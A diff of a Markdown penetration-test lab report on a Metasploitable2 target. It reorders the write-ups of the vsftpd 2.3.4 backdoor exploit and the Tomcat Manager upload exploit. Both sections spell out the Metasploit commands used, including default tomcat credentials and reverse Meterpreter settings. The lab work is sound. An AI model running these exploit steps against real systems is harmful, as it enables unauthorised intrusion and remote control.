@@ -38,15 +38,15 @@ These services were subsequently investigated and exploited where applicable.
 
 ---
 
-# Exploit 1 – vsftpd 2.3.4 Backdoor
+# Exploit 1 – Apache Tomcat Manager Upload Code Execution
 
 ## Service / Port
 
-**FTP — Port 21**
+**Apache Tomcat — Port 8180**
 
 ## Vulnerability
 
-The target was running **vsftpd 2.3.4**, a version associated with a malicious backdoor that can provide remote command execution.
+The Apache Tomcat Manager application was accessible using default credentials, allowing a WAR file to be uploaded and executed.
 
 ## Tool Used
 
@@ -55,64 +55,67 @@ The target was running **vsftpd 2.3.4**, a version associated with a malicious b
 **Exploit module:**
 
 ```text
-exploit/unix/ftp/vsftpd_234_backdoor
+exploit/multi/http/tomcat_mgr_upload
 ```
 
 ## Why This Tool Was Appropriate
 
-Metasploit was appropriate because it provides a dedicated exploit module for the vsftpd 2.3.4 backdoor. The module automates the process of connecting to the vulnerable FTP service and triggering the backdoor.
+The Metasploit module is specifically designed to exploit the Tomcat Manager application by authenticating to the management interface and uploading a malicious WAR file.
 
 ## Steps
 
-First, the target service was identified with Nmap:
+Nmap was used to identify the Tomcat service:
 
 ```bash
 nmap -sV 10.0.2.3
 ```
 
-SearchSploit was then used to investigate the available vsftpd vulnerabilities.
-
-```bash
-searchsploit vsftpd 2.3.4
-```
-
-Metasploit was started:
-
-```bash
-msfconsole
-```
-
-The exploit was searched for:
+The Tomcat Manager exploit was selected:
 
 ```text
-search vsftpd 2.3.4
+use exploit/multi/http/tomcat_mgr_upload
 ```
 
-The exploit module was selected:
-
-```text
-use exploit/unix/ftp/vsftpd_234_backdoor
-```
-
-The target IP was configured:
+The target was configured:
 
 ```text
 set RHOSTS 10.0.2.3
+set RPORT 8180
 ```
 
-The local attacker IP was configured:
+The Manager path was configured:
+
+```text
+set TARGETURI /manager
+```
+
+The Tomcat credentials were configured:
+
+```text
+set USERNAME tomcat
+set PASSWORD tomcat
+```
+
+The attacker machine was configured:
 
 ```text
 set LHOST 10.0.2.15
+set LPORT 4444
 ```
 
-The exploit was launched:
+The target was checked:
+
+```text
+check
+```
+
+The exploit was executed:
 
 ```text
 exploit
 ```
 
-A Meterpreter session was successfully obtained.
+A Meterpreter session was obtained.
 
 The session was verified using:
 
@@ -128,25 +131,27 @@ sysinfo
 pwd
 ```
 
-The session provided root-level access to the target.
-
 ## Evidence
 
-[View exploit1.png](evidence/exploit1.png)
+[View exploit6.png](evidence/exploit6.png)
 
 ## Cyber Kill Chain Stages
 
-* **Reconnaissance:** Nmap identified the FTP service and version.
-* **Weaponization:** The Metasploit vsftpd 2.3.4 backdoor module was selected and configured.
-* **Delivery:** The exploit was sent to the vulnerable FTP service.
-* **Exploitation:** The vsftpd backdoor was triggered.
-* **Installation:** A Meterpreter session was established.
-* **Command & Control:** The attacker controlled the target through the Meterpreter session.
-* **Actions on Objectives:** Commands such as `getuid`, `sysinfo`, and `pwd` were executed.
+* **Reconnaissance**
+* **Weaponization**
+* **Delivery**
+* **Exploitation**
+* **Installation**
+* **Command & Control**
+* **Actions on Objectives**
 
 ## Outcome / Impact
 
-The exploit successfully resulted in a **root-level Meterpreter session**. The target was identified as Ubuntu 8.04 running Linux kernel `2.6.24-16-server` on an i686 architecture.
+A Meterpreter session was successfully established as the **tomcat55** user.
+
+The target was identified as Linux `2.6.24-16-server` on i386 architecture.
+
+The session did not provide root privileges.
 
 ---
 
@@ -549,16 +554,15 @@ The connection provided a **root shell** directly on the target.
 The result demonstrates the serious risk of exposing an unauthenticated root command shell on a network service.
 
 ---
-
-# Exploit 6 – Apache Tomcat Manager Upload Code Execution
+# Exploit 6 – vsftpd 2.3.4 Backdoor
 
 ## Service / Port
 
-**Apache Tomcat — Port 8180**
+**FTP — Port 21**
 
 ## Vulnerability
 
-The Apache Tomcat Manager application was accessible using default credentials, allowing a WAR file to be uploaded and executed.
+The target was running **vsftpd 2.3.4**, a version associated with a malicious backdoor that can provide remote command execution.
 
 ## Tool Used
 
@@ -567,67 +571,64 @@ The Apache Tomcat Manager application was accessible using default credentials, 
 **Exploit module:**
 
 ```text
-exploit/multi/http/tomcat_mgr_upload
+exploit/unix/ftp/vsftpd_234_backdoor
 ```
 
 ## Why This Tool Was Appropriate
 
-The Metasploit module is specifically designed to exploit the Tomcat Manager application by authenticating to the management interface and uploading a malicious WAR file.
+Metasploit was appropriate because it provides a dedicated exploit module for the vsftpd 2.3.4 backdoor. The module automates the process of connecting to the vulnerable FTP service and triggering the backdoor.
 
 ## Steps
 
-Nmap was used to identify the Tomcat service:
+First, the target service was identified with Nmap:
 
 ```bash
 nmap -sV 10.0.2.3
 ```
 
-The Tomcat Manager exploit was selected:
+SearchSploit was then used to investigate the available vsftpd vulnerabilities.
 
-```text
-use exploit/multi/http/tomcat_mgr_upload
+```bash
+searchsploit vsftpd 2.3.4
 ```
 
-The target was configured:
+Metasploit was started:
+
+```bash
+msfconsole
+```
+
+The exploit was searched for:
+
+```text
+search vsftpd 2.3.4
+```
+
+The exploit module was selected:
+
+```text
+use exploit/unix/ftp/vsftpd_234_backdoor
+```
+
+The target IP was configured:
 
 ```text
 set RHOSTS 10.0.2.3
-set RPORT 8180
 ```
 
-The Manager path was configured:
-
-```text
-set TARGETURI /manager
-```
-
-The Tomcat credentials were configured:
-
-```text
-set USERNAME tomcat
-set PASSWORD tomcat
-```
-
-The attacker machine was configured:
+The local attacker IP was configured:
 
 ```text
 set LHOST 10.0.2.15
-set LPORT 4444
 ```
 
-The target was checked:
-
-```text
-check
-```
-
-The exploit was executed:
+The exploit was launched:
 
 ```text
 exploit
 ```
 
-A Meterpreter session was obtained.
+A Meterpreter session was successfully obtained.
 
 The session was verified using:
 
@@ -643,29 +644,27 @@ sysinfo
 pwd
 ```
 
+The session provided root-level access to the target.
+
 ## Evidence
 
-[View exploit6.png](evidence/exploit6.png)
+[View exploit1.png](evidence/exploit1.png)
 
 ## Cyber Kill Chain Stages
 
-* **Reconnaissance**
-* **Weaponization**
-* **Delivery**
-* **Exploitation**
-* **Installation**
-* **Command & Control**
-* **Actions on Objectives**
+* **Reconnaissance:** Nmap identified the FTP service and version.
+* **Weaponization:** The Metasploit vsftpd 2.3.4 backdoor module was selected and configured.
+* **Delivery:** The exploit was sent to the vulnerable FTP service.
+* **Exploitation:** The vsftpd backdoor was triggered.
+* **Installation:** A Meterpreter session was established.
+* **Command & Control:** The attacker controlled the target through the Meterpreter session.
+* **Actions on Objectives:** Commands such as `getuid`, `sysinfo`, and `pwd` were executed.
 
 ## Outcome / Impact
 
-A Meterpreter session was successfully established as the **tomcat55** user.
-
-The target was identified as Linux `2.6.24-16-server` on i386 architecture.
-
-The session did not provide root privileges.
-
+The exploit successfully resulted in a **root-level Meterpreter session**. The target was identified as Ubuntu 8.04 running Linux kernel `2.6.24-16-server` on an i686 architecture.
 ---
+
 
 # Exploit 7 – Java RMI Server Insecure Configuration
 
@@ -1034,7 +1033,7 @@ The session provided root-level access.
 
 ## Outcome / Impact
 
-The repeated exploit successfully produced a **root-level Meterpreter session** on the Metasploitable2 target.
+The exploit successfully produced a **root-level Meterpreter session** on the Metasploitable2 target.
 
 The target was identified as Ubuntu 8.04 running Linux `2.6.24-16-server` on i686 architecture.
 
